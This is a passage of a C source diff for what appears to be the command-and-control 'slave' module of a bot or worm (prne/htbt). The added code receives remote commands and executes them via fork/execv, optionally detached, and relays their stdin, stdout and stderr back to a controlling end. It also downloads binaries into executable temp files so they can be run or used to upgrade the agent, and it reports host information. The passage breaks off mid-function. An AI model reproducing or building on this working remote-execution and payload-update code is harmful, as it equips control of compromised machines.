+	prne_htbt_dser_ft dser_f,
+	const uint16_t *corr_id,
+	const bool mid, // true if another frame is expected
+	pth_event_t ev)
+{
+	prne_htbt_ser_rc_t rc;
+	prne_htbt_status_code_t st_code = PRNE_HTBT_STATUS_OK;
+	int32_t st_err = 0;
+	size_t actual;
+	ssize_t io_ret;
+
+	prne_iobuf_reset(ctx->iobuf + 0);
+	do {
+		rc = dser_f(ctx->iobuf[0].m, ctx->iobuf[0].len, &actual, f);
+		switch (rc) {
+		case PRNE_HTBT_SER_RC_OK: return true;
+		case PRNE_HTBT_SER_RC_MORE_BUF:
+			prne_assert(ctx->iobuf[0].len < actual);
+
+			if (ctx->iobuf[0].size < actual) {
+				st_code = PRNE_HTBT_STATUS_ERRNO;
+				st_err = ENOMEM;
+				if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_WARN) {
+					prne_dbgpf(
+						HTBT_NT_SLV"@%"PRIuPTR": recv frame too large "
+						"buf size=%zu actual=%zu\n",
+						(uintptr_t)ctx,
+						ctx->iobuf[0].size,
+						actual);
+				}
+				break;
+			}
+
+			io_ret = htbt_slv_read(
+				ctx,
+				ctx->iobuf[0].m + ctx->iobuf[0].len,
+				actual - ctx->iobuf[0].len,
+				ev);
+			if (!mid) {
+				if (io_ret <= 0) {
+					return false;
+				}
+			}
+			if (io_ret < 0) {
+				return false;
+			}
+			if (io_ret == 0) {
+				st_code = PRNE_HTBT_STATUS_PROTO_ERR;
+				break;
+			}
+			prne_iobuf_shift(ctx->iobuf + 0, io_ret);
+			break;
+		case PRNE_HTBT_SER_RC_FMT_ERR:
+			st_code = PRNE_HTBT_STATUS_PROTO_ERR;
+			break;
+		case PRNE_HTBT_SER_RC_ERRNO:
+			st_code = PRNE_HTBT_STATUS_ERRNO;
+			st_err = errno;
+			break;
+		default:
+			st_code = PRNE_HTBT_STATUS_ERRNO;
+			break;
+		}
+	} while (st_code == PRNE_HTBT_STATUS_OK);
+
+	htbt_slv_send_status(ctx, corr_id, st_code, st_err, ev);
+	return false;
+}
+
+static bool htbt_slv_recv_mh (
+	htbt_slv_ctx_t *ctx,
+	prne_htbt_msg_head_t *mh,
+	const uint16_t *corr_id,
+	const bool mid,
+	pth_event_t ev)
+{
+	bool ret = htbt_slv_recv_frame(
+		ctx,
+		mh,
+		(prne_htbt_dser_ft)prne_htbt_dser_msg_head,
+		corr_id,
+		mid,
+		ev);
+
+	if (ret) {
+		htbt_slv_on_mh(ctx, 0, mh);
+		if (mh->op != PRNE_HTBT_OP_NOOP && mh->is_rsp) {
+			// Slave context received a response frame?
+			// this a protocol error
+			htbt_slv_raise_protoerr(
+				ctx,
+				&mh->id,
+				0,
+				ev,
+				"received response mh");
+			ret = false;
+		}
+		if (corr_id != NULL && *corr_id != mh->id) {
+			htbt_slv_raise_protoerr(
+				ctx,
+				&mh->id,
+				0,
+				ev,
+				"msg id assertion fail");
+			ret = false;
+		}
+	}
 
 	return ret;
 }
 
-static void htbt_slv_srv_hostinfo (
+static bool htbt_slv_recv_stdio (
 	htbt_slv_ctx_t *ctx,
-	pth_event_t root_ev,
-	size_t off,
-	const prne_htbt_msg_head_t *mh)
+	prne_htbt_stdio_t *stdio,
+	const uint16_t *corr_id,
+	pth_event_t ev)
 {
-	prne_htbt_host_info_t hi;
+	const bool ret = htbt_slv_recv_frame(
+		ctx,
+		stdio,
+		(prne_htbt_dser_ft)prne_htbt_dser_stdio,
+		corr_id,
+		true,
+		ev);
 
-	prne_iobuf_shift(ctx->iobuf + 0, -off);
-
-	if (ctx->cbset->hostinfo == NULL) {
-		htbt_slv_fab_status(
-			ctx,
-			PRNE_HTBT_STATUS_UNIMPL,
-			0,
-			mh->id,
-			root_ev);
-		return;
+	if (ret) {
+		htbt_slv_on_stdio(ctx, false, stdio);
 	}
 
-	prne_htbt_init_host_info(&hi);
-
-	if (ctx->cbset->hostinfo(ctx->cb_ctx, &hi)) {
-		htbt_slv_fab_frame(
-			ctx,
-			mh,
-			&hi,
-			(prne_htbt_ser_ft)prne_htbt_ser_host_info,
-			root_ev);
-	}
-	else {
-		htbt_slv_fab_status(
-			ctx,
-			PRNE_HTBT_STATUS_ERRNO,
-			errno,
-			mh->id,
-			root_ev);
-	}
-
-	prne_htbt_free_host_info(&hi);
+	return ret;
 }
 
-static bool htbt_slv_srv_run_cmd (
+static bool htbt_slv_srv_noop (htbt_slv_ctx_t *ctx) {
+	bool ret;
+	prne_htbt_msg_head_t mh;
+	pth_event_t ev = NULL;
+
+	prne_htbt_init_msg_head(&mh);
+	mh.op = PRNE_HTBT_OP_NOOP;
+	mh.is_rsp = true;
+
+	prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
+	ret = htbt_slv_send_mh(ctx, &mh, ev);
+
+	prne_htbt_free_msg_head(&mh);
+	pth_event_free(ev, FALSE);
+	return ret;
+}
+
+static bool htbt_relay_child_evconn (
 	htbt_slv_ctx_t *ctx,
-	pth_event_t root_ev,
-	size_t off,
-	const prne_htbt_msg_head_t *mh)
+	const uint16_t msg_id,
+	prne_htbt_msg_head_t *mh,
+	prne_htbt_stdio_t *stdio,
+	int *c_in,
+	prne_iobuf_t *ib,
+	pth_event_t *ev)
 {
-	bool ret = true;
-	size_t actual;
-	prne_htbt_ser_rc_t s_ret;
+	ssize_t io_ret;
+
+	if (stdio->len == 0) {
+		prne_pth_reset_timer(ev, &HTBT_SLV_SCK_OP_TIMEOUT);
+		if (!htbt_slv_recv_mh(ctx, mh, &msg_id, true, *ev)) {
+			return false;
+		}
+
+		switch (mh->op) {
+		case PRNE_HTBT_OP_NOOP: return htbt_slv_srv_noop(ctx);
+		case PRNE_HTBT_OP_STDIO: break;
+		default:
+			htbt_slv_raise_protoerr(
+				ctx,
+				&mh->id,
+				0,
+				*ev,
+				"%02X: invalid op relaying child",
+				mh->op);
+			return false;
+		}
+
+		if (!htbt_slv_recv_stdio(ctx, stdio, &msg_id, *ev)) {
+			return false;
+		}
+		if (stdio->err) {
+			htbt_slv_raise_protoerr(
+				ctx,
+				&msg_id,
+				0,
+				*ev,
+				"received stdio frame with err bit set");
+			return false;
+		}
+	}
+
+	if (stdio->len > 0) {
+		io_ret = htbt_slv_read(
+			ctx,
+			ib->m + ib->len,
+			prne_op_min(ib->avail, stdio->len),
+			NULL);
+		if (io_ret <= 0) {
+			return false;
+		}
+
+		prne_iobuf_shift(ib, io_ret);
+		stdio->len -= io_ret;
+		// when stdio->len reaches zero here, c_in will be closed on the next
+		// iteration.
+	}
+	else if (/* stdio->len == 0 && */stdio->fin) {
+		// when stdio with zero len and fin set received.
+		prne_close(*c_in);
+		*c_in = -1;
+	}
+
+	return true;
+}
+
+static bool htbt_relay_child_evflush (
+	htbt_slv_ctx_t *ctx,
+	const uint16_t msg_id,
+	const prne_htbt_stdio_t *stdio,
+	int *c_in,
+	prne_iobuf_t *ib,
+	pth_event_t *ev)
+{
+	ssize_t io_ret;
+
+	io_ret = write(*c_in, ib->m, ib->len);
+	if (io_ret <= 0) {
+		if (io_ret == 0) {
+			/* this shouldn't happen as c_in is pipe!
+			* just being defensive here in case some other author makes a
+			* mistake
+			*/
+			errno = EPIPE;
+		}
+		// It's up to authoritive end to decide if they should raise SIGPIPE
+		prne_pth_reset_timer(ev, &HTBT_SLV_SCK_OP_TIMEOUT);
+		htbt_slv_send_status(
+			ctx,
+			&msg_id,
+			PRNE_HTBT_STATUS_ERRNO,
+			errno,
+			*ev);
+		return false;
+	}
+	prne_iobuf_shift(ib, -io_ret);
+
+	if (ib->len == 0 && stdio->len == 0 && stdio->fin) {
+		prne_close(*c_in);
+		*c_in = -1;
+	}
+
+	return true;
+}
+
+static bool htbt_relay_child_evchld (
+	htbt_slv_ctx_t *ctx,
+	const uint16_t msg_id,
+	const pid_t *c_pid,
+	prne_htbt_msg_head_t *mh,
+	prne_htbt_stdio_t *stdio,
+	int *c_out,
+	int *c_err,
+	prne_iobuf_t *ib,
+	pth_event_t *ev)
+{
+	/*
+	* - Read from the stdout/stderr.
+	* - send fin if EOF
+	* - flush data
+	* - on error: close stdout and stderr and send SIGPIPE to the child
+	*/
+	int *const c_arr[] = { c_out, c_err, NULL };
+	ssize_t io_ret;
+	bool ret = false;
+
+	mh->id = msg_id;
+	mh->is_rsp = true;
+	mh->op = PRNE_HTBT_OP_STDIO;
+
+	for (size_t i = 0; c_arr[i] != NULL; i += 1) {
+		int *const c = c_arr[i];
+
+		if (*c < 0) {
+			continue;
+		}
+		stdio->err = c == c_err;
+
+		io_ret = read(*c, ib->m, ib->avail);
+		if (io_ret < 0) {
+			if (prne_is_nberr(errno)) {
+				continue;
+			}
+			prne_pth_reset_timer(ev, &HTBT_SLV_SCK_OP_TIMEOUT);
+			htbt_slv_send_status(
+				ctx,
+				&msg_id,
+				PRNE_HTBT_STATUS_ERRNO,
+				errno,
+				*ev);
+			goto END;
+		}
+		if (io_ret == 0) {
+			prne_close(*c);
+			*c = -1;
+
+			stdio->fin = true;
+			stdio->len = 0;
+			prne_pth_reset_timer(ev, &HTBT_SLV_SCK_OP_TIMEOUT);
+			ret =
+				htbt_slv_send_mh(ctx, mh, *ev) &&
+				htbt_slv_send_stdio(ctx, stdio, *ev);
+			if (!ret) {
+				goto END;
+			}
+			continue;
+		}
+		prne_iobuf_shift(ib, io_ret);
+
+		stdio->fin = false;
+		stdio->len = io_ret;
+		prne_pth_reset_timer(ev, &HTBT_SLV_SCK_OP_TIMEOUT);
+		ret =
+			htbt_slv_send_mh(ctx, mh, *ev) &&
+			htbt_slv_send_stdio(ctx, stdio, *ev) &&
+			htbt_slv_wflush_ib(ctx, ib, *ev);
+		if (!ret) {
+			goto END;
+		}
+	}
+	ret = true;
+
+END:
+	if (!ret && ib->len > 0 && c_pid != NULL) {
+		// there is unsent data. Notify the process.
+		kill(*c_pid, SIGPIPE);
+	}
+
+	return ret;
+}
+
+/*
+*
+* Stdin data from the auth end is buffered and flushed when possible since
+* the process might not be accepting stdin data at all. Stdout and stderr data
+* are read from the process and sent to the auth end synchronously.
+* The assumption that the connection is stable and the auth end is constantly
+* consuming stdout/stderr data from the process.
+*
+* There's a chance of broken pipe case being silently ignored due to the nature
+* of multiplexing using poll(). For example, if the auth end sends a stdio frame
+* with len > 0 and fin set and the process closes its stdin with the data still
+* in the pipe, a SIGPIPE will be sent but there's no way to associate th signal
+* with the stdio pipes.
+*/
+static bool htbt_relay_child (
+	htbt_slv_ctx_t *ctx,
+	const uint16_t msg_id,
+	const pid_t *c_pid,
+	int *c_in,
+	int *c_out,
+	int *c_err)
+{
+	bool ret = false;
+	struct pollfd pfd[4];
+	prne_htbt_msg_head_t mh;
+	prne_htbt_stdio_t sh[2];
+	prne_iobuf_t ib[2];
+	pth_event_t ev = NULL;
+
+	pfd[0].fd = ctx->fd[0];
+	pfd[2].events = pfd[3].events = POLLIN;
+	prne_htbt_init_msg_head(&mh);
+	prne_htbt_init_stdio(sh + 0);
+	prne_htbt_init_stdio(sh + 1);
+	prne_init_iobuf(ib + 0);
+	prne_init_iobuf(ib + 1);
+
+	if (!(prne_try_alloc_iobuf(ib + 0, HTBT_STDIO_IB_SIZE) &&
+		prne_try_alloc_iobuf(ib + 1, HTBT_STDIO_IB_SIZE)))
+	{
+		goto END;
+	}
+
+	while (*c_out >= 0 || *c_err >= 0) {
+		// Do poll
+		pfd[1].fd = *c_in;
+		pfd[2].fd = *c_out;
+		pfd[3].fd = *c_err;
+		if (ib[0].len > 0) {
+			// focus on flushing incoming stdin data first.
+			pfd[0].events = 0;
+			pfd[1].events = POLLOUT;
+		}
+		else if (sh[0].fin) {
+			pfd[0].events = pfd[1].events = 0;
+		}
+		else {
+			pfd[0].events = POLLIN;
+			pfd[1].events = 0;
+		}
+
+		if ((pfd[0].events & POLLIN) && ctx->pending_f(ctx->ioctx)) {
+			pfd[0].revents = POLLIN;
+			pfd[1].revents = pfd[2].revents = pfd[3].revents = 0;
+		}
+		else {
+			prne_pth_reset_timer(&ev, &HTBT_RELAY_CHILD_TIMEOUT);
+			prne_pth_poll(pfd, sizeof(pfd) / sizeof(struct pollfd), -1, ev);
+
+			if (pth_event_status(ev) != PTH_STATUS_PENDING) {
+				prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
+				htbt_slv_send_status(
+					ctx,
+					&msg_id,
+					PRNE_HTBT_STATUS_ERRNO,
+					ETIMEDOUT,
+					ev);
+				goto END;
+			}
+		}
+
+		// Handle events
+		if (pfd[0].revents) {
+/* Incoming stdin data to the process
+* The process might not be accepting stdin data so we save the data in
+* the buffer and try to flush out the stdout/stderr data from the process at the
+* same time.
+*/
+			if (!htbt_relay_child_evconn(
+				ctx,
+				msg_id,
+				&mh,
+				sh + 0,
+				c_in,
+				ib + 0,
+				&ev))
+			{
+				goto END;
+			}
+		}
+		if (pfd[1].revents) {
+			// Flush buffered stdin data.
+			if (!htbt_relay_child_evflush(
+				ctx,
+				msg_id,
+				sh + 0,
+				c_in,
+				ib + 0,
+				&ev))
+			{
+				goto END;
+			}
+		}
+		if (pfd[2].revents || pfd[3].revents) {
+			// Send stdout and stderr data from the process to the auth end.
+			if (!htbt_relay_child_evchld(
+					ctx,
+					msg_id,
+					c_pid,
+					&mh,
+					sh + 1,
+					c_out,
+					c_err,
+					ib + 1,
+					&ev))
+			{
+				goto END;
+			}
+		}
+	}
+	ret = true;
+
+END:
+	prne_htbt_free_stdio(sh + 0);
+	prne_htbt_free_stdio(sh + 1);
+	prne_free_iobuf(ib + 0);
+	prne_free_iobuf(ib + 1);
+	prne_htbt_free_msg_head(&mh);
+	pth_event_free(ev, FALSE);
+	return ret;
+}
+
+static bool htbt_do_cmd (
+	const bool detach,
+	char *const *args,
+	htbt_slv_ctx_t *ctx,
+	const uint16_t msg_id,
+	prne_htbt_status_code_t *out_status,
+	int32_t *out_err)
+{
+	bool ret = false;
+	int cin[2] = { -1, -1 };
+	int cout[2] = { -1, -1 };
+	int cerr[2] = { -1, -1 };
+	int errp[2] = { -1, -1 };
+	pid_t child = -1, to_kill;
+	int f_ret, chld_status;
+	prne_htbt_status_code_t ret_status;
+	int32_t ret_err = 0;
+	pth_event_t ev = NULL;
+	pid_t w_ret;
+	struct timespec wait_start, wait_now, wait_dur;
+
+	if (pipe(errp) != 0 ||
+		fcntl(errp[0], F_SETFD, FD_CLOEXEC) != 0 ||
+		fcntl(errp[1], F_SETFD, FD_CLOEXEC) != 0)
+	{
+		ret_status = PRNE_HTBT_STATUS_ERRNO;
+		ret_err = errno;
+		goto END;
+	}
+	/*
+	* Create STDIO channels for detached process too so that the detached
+	* process doesn't end up with 0, 1 or 2 for fd of regular files.
+	*/
+	if (pipe(cin) != 0 || pipe(cout) != 0 || pipe(cerr) != 0) {
+		ret_status = PRNE_HTBT_STATUS_ERRNO;
+		ret_err = errno;
+		goto END;
+	}
+
+	if (detach) {
+		// Make it so that read/write() on stdio fds result in EOF or EPIPE
+		close(cin[1]);
+		close(cout[0]);
+		close(cerr[0]);
+		cin[1] = cout[0] = cerr[0] = -1;
+	}
+
+	to_kill = child = pth_fork();
+	if (child == 0) {
+		do { // TRY
+			if (ctx->cbset->fork != NULL && !ctx->cbset->fork(ctx->cb_ctx)) {
+				break;
+			}
+
+			pth_kill();
+			close(errp[0]);
+			prne_close(cin[1]);
+			prne_close(cout[0]);
+			prne_close(cerr[0]);
+			if (prne_chfd(cin[0], STDIN_FILENO) != STDIN_FILENO ||
+				prne_chfd(cout[1], STDOUT_FILENO) != STDOUT_FILENO ||
+				prne_chfd(cerr[1], STDERR_FILENO) != STDERR_FILENO)
+			{
+				break;
+			}
+
+			if (detach) {
+				child = fork();
+				if (child < 0) {
+					break;
+				}
+				else if (child > 0) {
+					exit(0);
+				}
+				setsid();
+			}
+			else {
+				if (setpgid(0, 0) != 0) {
+					break;
+				}
+			}
+			execv(args[0], args);
+		} while (false);
+		// CATCH
+		ret_err = errno;
+		write(errp[1], &ret_err, sizeof(int32_t));
+		raise(SIGKILL);
+	}
+	else if (child < 0) {
+		ret_status = PRNE_HTBT_STATUS_ERRNO;
+		ret_err = errno;
+		goto END;
+	}
+
+	// The parent continues ...
+	close(errp[1]);
+	errp[1] = -1;
+
+	prne_pth_reset_timer(&ev, &HTBT_CHILD_SPAWN_TIMEOUT);
+	f_ret = pth_read_ev(errp[0], &ret_err, sizeof(int32_t), ev);
+	if (f_ret == sizeof(int32_t)) {
+		ret_status = PRNE_HTBT_STATUS_ERRNO;
+		goto END;
+	}
+	else if (f_ret < 0) {
+		ret_status = PRNE_HTBT_STATUS_ERRNO;
+		ret_err = errno;
+		goto END;
+	}
+	prne_close(errp[0]);
+	errp[0] = -1;
+	to_kill = -child;
+
+	ret_status = PRNE_HTBT_STATUS_OK;
+	if (detach)  {
+		ret = true;
+	}
+	else {
+		prne_close(cin[0]);
+		prne_close(cout[1]);
+		prne_close(cerr[1]);
+		cin[0] = cout[1] = cerr[1] = -1;
+		if (!prne_sck_fcntl(cin[1]) ||
+			!prne_sck_fcntl(cout[0]) ||
+			!prne_sck_fcntl(cerr[0]))
+		{
+			ret_status = PRNE_HTBT_STATUS_ERRNO;
+			ret_err = errno;
+			goto END;
+		}
+
+		// don't goto END here. Reap the child process regardless of the result
+		// of htbt_relay_child() run.
+		ret = htbt_relay_child(
+			ctx,
+			msg_id,
+			&child,
+			cin + 1,
+			cout + 0,
+			cerr + 0);
+		prne_close(cin[1]);
+		prne_close(cout[0]);
+		prne_close(cerr[0]);
+		cin[1] = cout[0] = cerr[0] = -1;
+	}
+
+	wait_start = prne_gettime(CLOCK_MONOTONIC);
+	while (true) {
+		// try reapping every 1 second as pth does not provide pth_waitpid_ev()
+		w_ret = pth_waitpid(child, &chld_status, WUNTRACED | WNOHANG);
+		if (w_ret == 0) {
+			wait_now = prne_gettime(CLOCK_MONOTONIC);
+			wait_dur = prne_sub_timespec(wait_now, wait_start);
+
+			if (prne_cmp_timespec(wait_dur, HTBT_CHILD_SPAWN_TIMEOUT) < 0) {
+				prne_pth_reset_timer(&ev, &HTBT_CHILD_WAIT_INT);
+				pth_wait(ev);
+				continue;
+			}
+			ret_status = PRNE_HTBT_STATUS_ERRNO;
+			ret_err = ETIMEDOUT;
+			goto END;
+		}
+		else if (w_ret < 0) {
+			ret_status = PRNE_HTBT_STATUS_ERRNO;
+			ret_err = errno;
+			goto END;
+		}
+		else {
+			break;
+		}
+	}
+
+	if (WIFEXITED(chld_status)) {
+		ret_err = WEXITSTATUS(chld_status);
+		child = -1;
+	}
+	else if (WIFSIGNALED(chld_status)) {
+		ret_err = 128 + WTERMSIG(chld_status);
+		child = -1;
+	}
+	else if (WIFSTOPPED(chld_status)) {
+		// child has been stopped just right before exit
+		ret_err = 128 + SIGSTOP;
+	}
+	else {
+		ret_err = -1; // WTF?
+	}
+
+END:
+	pth_event_free(ev, FALSE);
+	prne_close(cin[0]);
+	prne_close(cin[1]);
+	prne_close(cout[0]);
+	prne_close(cout[1]);
+	prne_close(cerr[0]);
+	prne_close(cerr[1]);
+	prne_close(errp[0]);
+	prne_close(errp[1]);
+	if (child > 0) {
+		kill(to_kill, SIGKILL);
+		pth_waitpid(child, NULL, 0);
+	}
+
+	if (out_status != NULL) {
+		*out_status = ret_status;
+	}
+	if (out_err != NULL) {
+		*out_err = ret_err;
+	}
+
+	return ret;
+}
+
+// Process rogue STDIO frames.
+static bool htbt_slv_srv_stdio (htbt_slv_ctx_t *ctx, const uint16_t corr_id) {
+	bool ret = false;
+	prne_htbt_stdio_t sh;
+	pth_event_t ev = NULL;
+	ssize_t io_ret;
+
+	prne_htbt_init_stdio(&sh);
+	prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
+
+	if (!htbt_slv_recv_stdio(ctx, &sh, &corr_id, ev)) {
+		goto END;
+	}
+
+	prne_iobuf_reset(ctx->iobuf + 0);
+	while (sh.len > 0) {
+		io_ret = htbt_slv_read(
+			ctx,
+			ctx->iobuf[0].m,
+			prne_op_min(ctx->iobuf[0].avail, sh.len),
+			ev);
+		if (io_ret < 0) {
+			goto END;
+		}
+		if (io_ret == 0) {
+			htbt_slv_raise_protoerr(
+				ctx,
+				&corr_id,
+				0,
+				ev,
+				"EOF skipping rogue stdio frames");
+			goto END;
+		}
+		sh.len -= ctx->iobuf[0].len;
+	}
+	ret = true;
+
+END:
+	prne_htbt_free_stdio(&sh);
+	pth_event_free(ev, FALSE);
+	return ret;
+}
+
+static bool htbt_slv_srv_hostinfo (
+	htbt_slv_ctx_t *ctx,
+	const uint16_t corr_id)
+{
+	bool ret;
+	prne_htbt_host_info_t hi;
+	pth_event_t ev = NULL;
+
+	prne_htbt_init_host_info(&hi);
+	prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
+
+	if (ctx->cbset->hostinfo == NULL) {
+		ret = htbt_slv_send_status(
+			ctx,
+			&corr_id,
+			PRNE_HTBT_STATUS_UNIMPL,
+			0,
+			ev);
+	}
+	else if (ctx->cbset->hostinfo(ctx->cb_ctx, &hi)) {
+		prne_htbt_msg_head_t mh;
+
+		prne_htbt_init_msg_head(&mh);
+		mh.op = PRNE_HTBT_OP_HOST_INFO;
+		mh.is_rsp = true;
+		mh.id = corr_id;
+
+		ret =
+			htbt_slv_send_mh(ctx, &mh, ev) &&
+			htbt_slv_send_frame(
+				ctx,
+				&hi,
+				(prne_htbt_ser_ft)prne_htbt_ser_host_info,
+				ev);
+
+		prne_htbt_free_msg_head(&mh);
+	}
+	else {
+		ret = htbt_slv_send_status(
+			ctx,
+			&corr_id,
+			PRNE_HTBT_STATUS_ERRNO,
+			errno,
+			ev);
+	}
+
+	pth_event_free(ev, FALSE);
+	prne_htbt_free_host_info(&hi);
+	return ret;
+}
+
+static bool htbt_slv_srv_run_cmd (htbt_slv_ctx_t *ctx, const uint16_t corr_id) {
+	bool ret;
 	prne_htbt_cmd_t cmd;
+	pth_event_t ev = NULL;
 	prne_htbt_status_code_t status = PRNE_HTBT_STATUS_ERRNO;
 	int32_t err = 0;
 
 	prne_htbt_init_cmd(&cmd);
 
-	s_ret = prne_htbt_dser_cmd(
-		ctx->iobuf[0].m + off,
-		ctx->iobuf[0].len - off,
-		&actual,
-		&cmd);
-	if (s_ret == PRNE_HTBT_SER_RC_MORE_BUF) {
-		ret = false;
-		goto END;
-	}
-	else {
-		prne_iobuf_shift(ctx->iobuf + 0, -(off + actual));
-	}
-	if (s_ret == PRNE_HTBT_SER_RC_ERRNO) {
-		htbt_slv_fab_status(
-			ctx,
-			PRNE_HTBT_STATUS_ERRNO,
-			errno,
-			mh->id,
-			root_ev);
-		goto END;
-	}
-	if (s_ret != PRNE_HTBT_SER_RC_OK) {
-		htbt_slv_raise_protoerr(ctx, mh->id, 0);
+	prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
+	ret = htbt_slv_recv_frame(
+		ctx,
+		&cmd,
+		(prne_htbt_dser_ft)prne_htbt_dser_cmd,
+		&corr_id,
+		true,
+		ev);
+	if (!ret) {
 		goto END;
 	}
 
-	htbt_slv_consume_outbuf(ctx, ctx->iobuf[1].len, root_ev);
-	if (root_ev != NULL && pth_event_status(root_ev) == PTH_STATUS_PENDING) {
-		htbt_do_cmd(cmd.detach, cmd.args, ctx, mh->id, &status, &err);
-		htbt_slv_fab_status(ctx, status, err, mh->id, NULL);
-	}
+	ret = htbt_do_cmd(cmd.detach, cmd.args, ctx, corr_id, &status, &err);
+
+	prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
+	ret &= htbt_slv_send_status(ctx, &corr_id, status, err, ev);
 
 END:
+	pth_event_free(ev, FALSE);
 	prne_htbt_free_cmd(&cmd);
 	return ret;
 }
 
 static bool htbt_slv_srv_bin (
 	htbt_slv_ctx_t *ctx,
-	pth_event_t root_ev,
-	size_t off,
-	const prne_htbt_msg_head_t *mh)
+	const uint16_t corr_id,
+	const prne_htbt_op_t op)
 {
-	bool ret = true;
+	bool ret = false;
+	prne_htbt_msg_head_t mh;
 	prne_htbt_bin_meta_t bin_meta;
-	size_t actual;
-	prne_htbt_ser_rc_t s_ret;
+	prne_htbt_stdio_t stdio_f;
 	char *path = NULL;
 	char **args = NULL;
-	int fd = -1, f_ret;
-	struct pollfd pfd;
+	int fd = -1;
 	pth_event_t ev = NULL;
 	prne_htbt_status_code_t ret_status = PRNE_HTBT_STATUS_OK;
 	int32_t ret_errno = 0;
 	htbt_lmk_t lmk = HTBT_LMK_NONE;
+	ssize_t io_ret;
 
 	prne_dbgast(
-		mh->op == PRNE_HTBT_OP_RUN_BIN ||
-		mh->op == PRNE_HTBT_OP_UP_BIN);
+		op == PRNE_HTBT_OP_RUN_BIN ||
+		op == PRNE_HTBT_OP_UP_BIN);
 
+	prne_htbt_init_msg_head(&mh);
 	prne_htbt_init_bin_meta(&bin_meta);
+	prne_htbt_init_stdio(&stdio_f);
 
-	htbt_slv_consume_outbuf(ctx, ctx->iobuf[1].len, root_ev);
-
-	s_ret = prne_htbt_dser_bin_meta(
-		ctx->iobuf[0].m + off,
-		ctx->iobuf[0].len - off,
-		&actual,
-		&bin_meta);
-	if (s_ret == PRNE_HTBT_SER_RC_MORE_BUF) {
-		ret = false;
+	prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
+	if (!htbt_slv_recv_frame(
+			ctx,
+			&bin_meta,
+			(prne_htbt_dser_ft)prne_htbt_dser_bin_meta,
+			&corr_id,
+			true,
+			ev))
+	{
 		goto END;
-	}
-	else {
-		off += actual;
-		prne_iobuf_shift(ctx->iobuf + 0, -off);
-	}
-	if (s_ret != PRNE_HTBT_SER_RC_OK) {
-		goto PROTO_ERR;
 	}
 
 	if (ctx->cbset->tmpfile == NULL ||
-		(mh->op == PRNE_HTBT_OP_UP_BIN && ctx->cbset->upbin == NULL))
+		(op == PRNE_HTBT_OP_UP_BIN && ctx->cbset->upbin == NULL))
 	{
 		ret_status = PRNE_HTBT_STATUS_UNIMPL;
 		goto SND_STATUS;
 	}
 
-	if (mh->op == PRNE_HTBT_OP_UP_BIN && ctx->lm_acquire_f != NULL) {
+	if (op == PRNE_HTBT_OP_UP_BIN && ctx->lm_acquire_f != NULL) {
 		if (ctx->lm_acquire_f(ctx->ioctx, HTBT_LMK_UPBIN)) {
 			lmk = HTBT_LMK_UPBIN;
 		}
@@ -1203,7 +1600,7 @@ static bool htbt_slv_srv_bin (
 		ctx->cb_ctx,
 		O_CREAT | O_TRUNC | O_WRONLY,
 		0700,
-		bin_meta.bin_size,
+		bin_meta.alloc_len,
 		&path);
 	if (fd < 0) {
 		ret_status = PRNE_HTBT_STATUS_ERRNO;
@@ -1212,74 +1609,85 @@ static bool htbt_slv_srv_bin (
 	}
 	fcntl(fd, F_SETFD, FD_CLOEXEC);
 
-	pfd.fd = ctx->fd[0];
-	pfd.events = POLLIN;
-	while (bin_meta.bin_size > 0 || ctx->iobuf[0].len > 0) {
-		pth_event_free(ev, FALSE);
-		ev = pth_event(
-			PTH_EVENT_TIME,
-			prne_pth_tstimeout(HTBT_DL_TICK_TIMEOUT));
-		prne_assert(ev != NULL);
+	do {
+		prne_pth_reset_timer(&ev, &HTBT_DL_TICK_TIMEOUT);
 
-		if (bin_meta.bin_size > 0 && ctx->iobuf[0].avail > 0) {
-			pfd.revents = 0;
-			if (ctx->pending_f(ctx->ioctx)) {
-				pfd.revents = POLLIN;
+		if (!htbt_slv_recv_mh(ctx, &mh, &corr_id, true, ev)) {
+			goto END;
+		}
+		switch (mh.op) {
+		case PRNE_HTBT_OP_NOOP:
+			if (!htbt_slv_srv_noop(ctx)) {
+				goto END;
 			}
-			else {
-				f_ret = prne_pth_poll(&pfd, 1, -1, ev);
-				if (pth_event_status(ev) == PTH_STATUS_OCCURRED ||
-					f_ret == 0)
-				{
-					ret_status = PRNE_HTBT_STATUS_ERRNO;
-					ret_errno = ETIMEDOUT;
+			continue;
+		case PRNE_HTBT_OP_STDIO: break;
+		default:
+			htbt_slv_raise_protoerr(
+				ctx,
+				&corr_id,
+				0,
+				ev,
+				"%02X: invalid op downloading binary",
+				mh.op);
+			goto END;
+		}
+		if (!htbt_slv_recv_stdio(ctx, &stdio_f, &corr_id, ev)) {
+			goto END;
+		}
+
+		prne_iobuf_reset(ctx->iobuf + 0);
+		while (stdio_f.len > 0 || ctx->iobuf[0].len > 0) {
+			if (stdio_f.len > 0) {
+				io_ret = htbt_slv_read(
+					ctx,
+					ctx->iobuf[0].m + ctx->iobuf[0].len,
+					prne_op_min(stdio_f.len, ctx->iobuf[0].avail),
+					ev);
+				if (io_ret < 0) {
+					goto END;
+				}
+				if (io_ret == 0) {
+					htbt_slv_raise_protoerr(
+						ctx,
+						&corr_id,
+						0,
+						ev,
+						"EOF downloading binary");
+					goto END;
+				}
+				prne_iobuf_shift(ctx->iobuf + 0, io_ret);
+				stdio_f.len -= io_ret;
+				if (PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
+					prne_dbgpf(
+						HTBT_NT_SLV"@%"PRIuPTR": < bin dl %zd bytes.\n",
+						(uintptr_t)ctx,
+						io_ret);
+				}
+			}
+
+			// This blocks!
+			io_ret = write(fd, ctx->iobuf[0].m, ctx->iobuf[0].len);
+			if (io_ret <= 0) {
+				ret_status = PRNE_HTBT_STATUS_ERRNO;
+				if (io_ret < 0) {
+					ret_errno = errno;
+				}
+				ret = htbt_slv_skip(ctx, stdio_f.len, ev);
+				if (ret) {
 					goto SND_STATUS;
 				}
-			}
-
-			if (pfd.revents) {
-				f_ret = ctx->read_f(
-					ctx->ioctx,
-					ctx->iobuf[0].m + ctx->iobuf[0].len,
